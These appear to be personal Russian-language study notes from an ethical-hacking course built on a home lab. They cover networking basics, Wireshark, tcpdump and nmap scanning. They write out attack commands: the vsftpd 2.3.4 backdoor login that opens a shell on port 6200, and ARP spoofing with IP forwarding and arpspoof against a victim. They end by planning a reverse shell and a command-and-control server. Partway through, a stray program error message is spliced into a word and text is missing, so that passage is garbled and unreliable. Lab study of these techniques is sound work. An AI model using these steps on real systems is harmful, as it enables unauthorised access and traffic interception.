Общее описание сети

Для начала я бы хотел разобраться с сетевыми технологиями
И так, сеть в целом можно представить как круглый стол, а вместо людей сидящих за ним, устройства, которые так-же как и люди общаются 
между собой. Это могут быть как и оконечные узлы(устройства, которые преобразуют пользовательскую информацию в данные для 
передачи по линии связи и осуществляющее обратное преобразование, wifi или bluetooth адаптер), так
и промежуточные устройства(устройства, которые соединяют эти устройства, коммутаторы, маршрутизаторы, модемы), а среды
между ними называются сетевыми(кабель, оптический канал). У людей за круглым столом есть ряд правил, в сети они называются  - протоколы. 
В ним может установка соединяния, скорость соединяния, и сколько времени ждать, формат данных и в каком виде они будут представлены
что делать с случае ошибок, и закрытие соединяния.
Однако если собрать слишком большую компанию, то возникнет ряд проблем:
Кто-то не услышит информацию, В некоторых случаях лучше обратиться лично к человеку, 
а также лучше разбить их всех на маленькие группы иначе только один будет говорить
Для этого и нужны промежуточные устройства.

Пакеты и адрес, ARP-спуфинг

Вся информация в сети передается пакетами, их можно представить, как конверты, на которых есть отправитель и получатель, только вместо имен и адреса, MAC и IP адреса
И так, MAC адрес - адрес у сетевой карты, которая и подключает ноутбук или компьютер к wifi, этот адрес можно представить как имя. Перед отправкой информации
маршрутизатор помечает соотвествующий пакет MAC адресом устройства, а потом передает его в виде радиосигнала. Все устройства подключенные к этой сети, получают
этот радиосигнал и проверяют MAC адрес пакета, чтобы выяснить, кому он предназначен. Как правило этот адрес - 48 битное значение записанное в 16 системе счисления.
Что же такое IP-адрес. Сеть состоит из иерархических регионов(условно: глобальных провайдер, национальный, местный, а уже потом маршрутизатор wifi и модем,)
IP-адрес можно предствить, как место в сети, поэтому если перейти из одного кафе в другое, то MAC-адрес останится прежним, а вот IP-адрес поменяется.
Как выглядит поиск информации в браузере, сначала веб-запрос идет в сетевую карту, затем на маршрутизатор, который установлен например в кафе, 
затем запрос отправляется мультиплексору(устройства, которое позволяет передавать интренет-трафик, по проводам, а так-же может различать интренет сигнал
от телевизионного => можно подключить телевизор и маршрутизатор к одну и тому же разьему), который передает запрос на маршрутизатор интернет-провайдера,
который в свою очередь и маршрутизаторы провайдера сравнивают префиксы IP-адреса в поиске совпадений, и так пакет доходит до нижнего уровня, на котором отсутствуют
другие маршрутизаторы, и ипользует MAC-адрес для определения пункта назначения запроса, этот уровень называется LAN - local area network(локальный вычислительный 
уровень). После этого маршрутизатор отправляет всем устройствам, которые подключены к сети, преслать свой MAC-адрес, а потом он сопостовляет IP и MAC адрес в 
ARP-таблице, что не делать это повторно. 
ЕСЛИ ВКРАТЦЕ - MAC-адрес идентифицирует компьютер, IP-адрес определяет его местоположение, а ARP-таблицы хранят результаты сопостовляя этих фрагментов информации.
При ARP спуфинг злоумышленник хочет выдать себя за кого-то другого.



Короче я сейчас должен создать несколько виртуальных машин:
1. kali linux - основная система с которой я буду проводить атаки
2. ubuntu desktop - одну под одного пользователя, другую как сервер
3. Metaspoitable - сервер linux, который специально будет уязвимым, и на котоурый бдут проводиться атаки
4. pfSense - маршрутизатор
pfSense можно предствить в качестве привратника, который стоит между интренетом 
и внутренней сетью. Он проверяет входящий и исходящий трафик, чтобы убедиться в том
внутренняя сеть защищена от атак извне. Он помогается создать машины, которые будет
уязвимы и только пользователь сможет их атаковать.
а Metaspoitable - это машина, которые мы будет взламывать, но сначала ее нужно ограничить
от доступа к ней другим пользавателям, для этого как-раз и нужен pfsense.

Инструмент netdiscover - утилита, которая сканирует сеть, рассылая ARP-запросы по всем IP-адресам в подсети, а потом соотвественно сопостовляет MAC и IP адреса,
кроме того выводит еще прозводителя сетевой карты по MAC-адресу. Как правило машины с наименьшим IP-адресом является маршрутизатором

"Бэкдор"
Первая тестовая атака будет совершена на Metaspoitable, при помощи уязвимость  "бэкдор".
Бэкдор - кусок вредоносного кода в opensource софте, позволяющий злоумышленнику получить
к ней несанкционированный доступ.
Этот бэкдор, который я буду использовать, который был исправлен в 2011, давал доступ к 
терминалу на скомпроментированной машине. Для этого было достаточно пройти аутентификацию
на FTP сервере, ввидя любое имя пользователя, которое заканчивалось на :), и любой пароль.
После активации атаки на порте 6200 открывалась оболочка терминала shell, и теперь можно 
управлять чужой машиной удаленно.  
Список команд:
sudo netdiscover
сканирует сеть
nc <IP-адрес сервера> 21
авторизация на сервере
user <любое имя>:)
pass <любой пароль> 
nc -v <IP-адрес сервера> 6200
активация порта 6200 на сервере
далее можно делать с сервером все что угодно

ARP-спуфинг
Короче, при этом методе атаки есть два этапа, первый - злоумышленник заставляет думать устройство жертвы, что его компьютер маршрутизатор(он отправляет
жертве поддельный ARP-ответ с информацей, что MAC-адрес соотвествует IP-адресу маршрутизатора), второй - компьютер жертвы принимает поддельный ARP-пакет и 
обновляет информацию в ARP-таблице, чтобы отразить соответствие MAC-адреса злоумышленника  IP-адресу маршрутизатора. После этого интернет-трафик, будет отправляться
злоумышленнику, после анализа которого, он может отправить его маршрутизатору.
Условно это можно предствить, как когда вор, говорит клиенту почты, что он почтальон, клиент отдает ему письмо, а вор после того как прочитал письмо, отдает
его реальному работнику почты.
Если злоумышленник хочет также получать ответный трафик, то его надо провернуть тоже самое, только для маршрутизатора.
Сначала нужно просканировать сеть при помощи netdiscover, далее нунжо разрешить машине Kali linux рассылать пакеты от имени других машин, включив пересылку IP-адресов
sudo netdiscover
сканирует сеть
echo 1 > /pros/sys/net/ipv4/ip_forward
разрешение на отправку пакетов от имено другой машины
arpspoof -i <port> -t <IP-адрес жертвы> <IP-адрес маршрутизатора>
отправка ложного ARP-пакета, который заставляет думать машину жертвы, что машина злоумышленника маршрутизатор
флаг -t обозначает цель, а -i интерфейс сетеon has occurred: IndexError
list index out of rangeнформацию, операционная система назначает ему номер порта, другими словами порты 
открывают для сети доступ к внутренним процессам.
Порты необходимы, посколько позволют нескольким запущенным процессам одновременно поключаться к интеренету, однако они могут представлять
угрозу, злоумышленник может подключиться к порту, и отправить по него вредоносные пакеты, таким образом заразить пк.

Пятиуровеневый стек интрнет протоколов.
И так в чем их смысл, каждый уровень работает отдельно и ничего не знает про информацию внутри пакета, он действует как будто он
один, то есть на действия уровня не влияют действия других уровней. Это достигается засчет инкапсуляции. 
Процесс, при котором каждый уровень обрабатывает инофрмацию, полученныю от вышележащих уровней, в виде обощенных данных, не 
пытаясь ее интерпретировать.
Вот они:
Прикладной(браузер <--> веб-сервер)
Транспортный(TCP/UDP)(OC <--> OC)
Сетевой(IP)(Маршрутизатор <--> Маршрутизатор)
Канальный(MAC)(Сетевая карта <--> Сетевая карта)
Физический(уже пакеты на устройстве получателя)

Сейчас я их рассмотрю более детально, ну или завтра.


Прикладной уровень - обеспечивает взаимодействие между приложениями, например между браузером Firefox и Университета Вирджинии.
Сущетвует несколько протоколов этого уровня. Протокол передачи гипертекста(HTTP), обеспечивает отправку веб-страниц браузерам,
а протокол передачи файлов(FTP), отвечает за загрузку файлов на сервер. На этом уровне разработчики сами могут создавать собст-
венные протоколы, там же в протоколы этого уровня входят DNS, BitTorrent. Также их можно модицифицировать(ну типо вроде 
оффицально нет ну ладно), так SMTP - протокол передачи почты, в следующих главах будут описаны способы взаимодействия с 
такими протоколами, например при помощи протокола DNS можно управлять и контролировать компьютер.

Транспортный - обеспечивает взаимодействие между процессами, которые обмениваются данными через интренет. Пакеты не всегда
могут доходить до пункта назаначения, поэтому на этом уровне есть всего два протокола TCP - протокол управления передачей,
котрый гарантирует доставку пакетов до пунта назначения, и менее сложный протокол - протокол пользовательских дейтаграмм UDP, 
который таких гарантий не дает.

Сетевой уровень - контролирует передачу пакетов между маршрутизаторами в сети. На этом уровне реализуется 
IP-адресация. Команда traceroute можно посмотреть все маршрутизаторы через которые проходит пакет до пункта назаначения. Также
можно посмотреть время, за которое они доходят. Работает это так - это программа отправляет каждому маршрутизатору три пакета,
и фиксирует время за которое они доходят, начиная с домашнего маршрутизатора, до маршрутизатора в точке назначения.

Канальный уровень - обеспечивает взаимодействие между сетевыми картами, а также обнаруживает ошибки, вознающие в процессе переди данных.
Например, сигнал WI-FI моежт исказиться во время передачи из-за помехи, порожаемых другими радиосигналами. Кроме того на этом уровне
действует протокол MAC, который отвечает за совместное использование среди передачи данных. По сути устройства в одной сети
из за протокола MAC, под названием множественный доступ с прослушиванием несущей, прослушивает сигналы Wi-Fi, и передает их 
только тогда, когда этого не кто не делает. То есть все ноутбуки в кафе, ждут своей очереди, чтобы передать данные.

Физический уровень - овтечает за преобразование единиц и нулей, с помощью которых данные закодированы в компьютере, в форму
передаваемого синала, например в радио/электрические сигналы, и даеж в звук. ТАк, для осуществления коммуникации на этом уровне,
может использоваться лазер, излучающий световые импульсы, передающиеся через оптоволоконный кабель.

Wireshark - инструмент, который позволяет перехватывать и просматривать пакеты, которые передаются через сетевую карту.
интрфейс lo - виртульный интерфейс, который называется интерфейсом обратной связи, который перенаправляет трафик обратно компу.
Теперь можно проанализировать трафик, который был захвачен ранне, при помощи ARP-спуфинга. После поступления в сетевую карту
пакеты дублируются, и копии отправляются непосрдетвенно инструменту Wireshark, при помощи драйверов из библиотеки NPCAP.
Одновременно с этим карта пересылает исходные пакеты в сетевую карту жертвы, откуда они отправляются в ее же браузер.
Браузер отображает веб-страницу, а жертва даже не подозревает о том, что ее пакеты были перехвачены.
Синтаксис для фильтров в Wireshark - такой:

[protocol].[header/field] [operator: +, ==, !=] [value]

Так можно легко найти все пакеты жертвы.
Так же можно фильтровать пакеты по их содержимому, например можно найти все пакеты TCP в который есть слово login

tcp contains login

Пакетов так много, потому что сервер разбивает исходный файл на мелкие фрагменты, а потом передает их в качестве отдельных пакетов,
если он слишком большой. Получатель повтороно сибрает эти пакеты, чтобы восставновить исходный файл. В этой программе можно восставновить
этот файл, для этого надо нажать на пакет, на пункт в меню follow -> TCP stream.

Порт 80 служит для передачи пакетов по протоколу HTTP - то есть может быть уязвимым, тогда как порт 443, уже служит, для 
передачи по протоколу HTTPS по сути тоже самое только все пакеты зашифрованы.(последняя буква - Secure)

При помощи команды tcpdump в маршрутизаторе, монжо посмотреть весь трафик, проходящий через него.
Как выглядит вывод:
1 - IP и протокол пакеты, обьедененные в одну строку типо, 192.168.100.41193, для улучшение читаемости IP-адрес преобразуется
в доменное имя, можно это отключить добавив флаг -n, также можно фильтровать трафик, как и в Wireshark, например, чтобы посмотреть
только tcp-пакеты на 443 порте и с IP-адреса вместо доменных именн, нужно написать, 

tcpdump tcp port 443 -n

Также можно записать все пакеты в файл, указав интерфейс, количество пакетов, и имя файла

tcpdump -i <интерфейс> -s <количество пакетов> -w <файл.pcap>
Там кстати потом очень интересные задания, которые намного легче, и понятнее чем в прошлой главе, хотя думаю они равны, просто
ты не знаешь библиотеку scapy, а также не знаешь полностью как стоить ARP-пакеты при помощи нее. Ну ладно все еще будет
на сегодня пока все.


Создание TCP оболочек и ботетов 
Чтобы пользоваться сервером, даже после устранение заражение на этом сервере, нужна обратая оболочка.

Сокет - это API, который позволяет программам обмениваться данными через сеть. Сущетвует два типа сокетов: TCP и UDP, соотвественно они используют,
одноименные протоколы, UDP - плохо защищен, однако очень быстрый, так что его используют например в аудио и видеозвонках.

TCP - рукопожатия
Маршрутизатора передают миллионы пакетов в секунду, та что они могут и удалить пакет, что является лишь одной и многих причин их пропажи, 
для того чтобы это избежать протокол TCP отслеживает все пакеты, и номерует их, если номера нет, то он пакет передается повторно.
Все файлы, который хранятся на компе, представленны в двоичном ввиде, перед отправкой файл, должен быть инкапсулирован в пакет, однако маскимальный 
размер TCP-пакетов состовляет 64 КБайт, поэтому большой файл разбивается на меньшие пакеты. Каждому такому пакету присваивается свой порядковый номер,
позволяющий в дальнейшей собрать  его обратно. Собираются они последовательно, однако каждый компьютер начинает со случайного числа, чтобы сделать
последовательность непредсказуемой для хакеров. Перед отправкой каждый компьютер должен получить и потвердить начальный порядковый номер,
для дальнейшего отслеживания потерянных пакетов. Такой обмен называется трехэтапным TCP-рукопожатием.
Сначала одно устройство посылает SYN-пакет, в котором говорит свой начальный номер, например SYN(3), посылает пакеты SYN-ACK, в котором пишет, 
свой начальный порядковый номер, а также ожидаемый следующий порядковый номер первого, потом второй посылает ACK-пакет, с ожидаемым следующий номером
второго, после этих действий, начинается обмен пакетами. После того как обмен закончился, они закрывают соединение, обмениваясь пакетыми FIN и ACK.
Протокол TCP обеспечивает полнодуплексную связь, что означает, что и отправитель и получатель могут обмениваться пакетами одновременно. 
Тогда как полнодуплексная, когда, логично, может обмениваться только по очереди. 

TCP-сокеты - фундаментальный строительные блоки сетевых приложений. Например, такие утлиты, как безопасная оболчка(SSH), использует сокеты для подклюения к удаленным серверам.
Взломав компьютер можно установить SSH-сервер и управлять машиной при помощи SHH клиента. ОДнако многие компании реализуют функцию межсетевого
экрана и трансляцию сетевых адресов (NAT), эти функцию не позволяют компьютерам за пределами сети, передавать пакеты, устройствам внутри этой сети,
однако эти устройства могут инициировать подклюение к машинам, за пределами сети. Благодаря этому сторонние злоумышленники не могут подключиться 
к серверам Google, а сотрудники могут. Условно можно сказать что это стена, которая существует только для устройств вне сети, тогда как другие ее не видят
Для обхода хакер может установить на скомпроментированный компютер программу, называемую обратной оболочкой, которая будут подключаться изнутри сети к 
компу хакера, за пределами сети. ПОсле этого, хакер смотрет отправлять ей команды, которые она затем может выполнить на сервере организации. 
Многие оболочки также могут масировать совй трафик, передавая данных через порт 53 и инкапсулируя их в DNS-пакеты.

Она сосотоит из двух частей: 
компонента, который подлючается к компьютеру злоумышленника
и компонента, который позволяет хакеру выполнять команды терминала на машине жертвы.

Это работает так:
Клиент на машине жертвы, запрашивает у системы новый сокет. Создав его, операционная система присваивает  ему номер порта и связывает его с обратной оболочкой. тоже
самое происходит и на машине хакера., на котороый работает TCP-сервер,, заправшивающий у системы конкретный номер порта. 
Эта уникальная комбинация номера порта и IP-адреса позволяет TCP-клинтам на других машинах идентифицировать его.
Эта модель называется - клиент - сервер, она используется повсюду в интернете, например когда ты с TCP-сервером гугл, который работает через порт 80
и имеет IP-адрес 172.217.12.238

Для нахождения открытых портов используется инструмент nmap, нужно просто указать указать название инструмента, флаг -sV, активирует функцию, которая
определяет версию каждого приложения, используещего конкретный порт, и IP-адрес, машины которую надо сканировать на открытые порты.
Но также есть и SYN-сканирование, которые просто отправляет TCP-SYN-пакет, если ему отвечают SYN-ACK-пакетом, то этот порт считается открытым.
ОДнако он не заканчивает рукопожатие. Такое сканирование дольше, его можно запустить командой с флагом -sS.
Также сис админ может пометить, какие пакеты можно посылать, а какие нет. Они могут например заблокировать входящие пакеты на порте 22, а отправленные может 
разрешить. Таким образом SYN-пакеты могут быть заблокированы. Тогда можно использовать FIN-сканивароние(-sF)
Кроме того можно запустить X-mas сканирование(-sX),  там используются пакеты с нечетной конфигурацией, для предотвращения обнаружения.

После того как узнал версию запущенного приложения, можно проверить его на сайте Национальной базы данных уязвимостей(https://nvd.nist.gov/)
на предмет наличия уязвимостей. В главе 8 будет этот процесс будет автомотизирован.
Если все норм, или админы часто обновляют система, то хакер обнаруживает неизвестную уязвимость, или же уязвимость нулевого дня, 
поскольку жертва о ней не знает, и соответственно, не раполагает временем для ее устанения.

Теперь можно воспользоваться бэкдором, из главы 1. Он работает, потому что версия vsftp 2.3.4, имеет заражение в коде.
Далее при помощи этой уязвимости можно загрузить на машину жертвы обратную оболочку.

После того как я написал обратную оболочку(ну как я просто с гитхаба книги скопировал код), мне нужно сделать TCP-сервер, который будет
выполнять две функции:
принимать соединения от клинтов
отправлять и получать команды. Такой сервер называется сервером управленияи котроля(CNC) 